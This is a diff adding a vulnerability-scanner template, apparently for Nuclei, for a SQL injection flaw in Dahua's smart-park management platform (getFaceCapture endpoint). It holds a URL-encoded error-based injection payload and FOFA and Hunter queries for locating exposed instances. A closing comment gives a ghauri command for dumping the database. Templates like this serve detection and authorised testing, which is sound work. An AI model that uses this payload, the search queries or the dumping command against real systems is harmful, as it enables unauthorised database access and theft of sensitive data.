@@ -1,0 +1,35 @@
+id: dahua-wpms-searchjson-sqli
+
+info:
+  name: dahua-wpms-searchjson-sqli
+  author: hufei
+  severity: high
+  description: 大华智慧园区综合管理平台 getFaceCapture 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意SQL语句，获取数据库敏感信息
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%20%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20getFaceCapture%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    veified: true
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
+    max-request: 1
+  tags: dahua,wpms,sqli
+
+http:
+  - method: GET
+    path: 
+      - "{{RootURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        words:
+          - "soap:Server"
+          - "for SQL"
+          - "XPATH syntax error"
+        condition: and
+
+#跑数据：ghauri -u https://ip/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221*%22%7D/extend/%7B%7D --batch
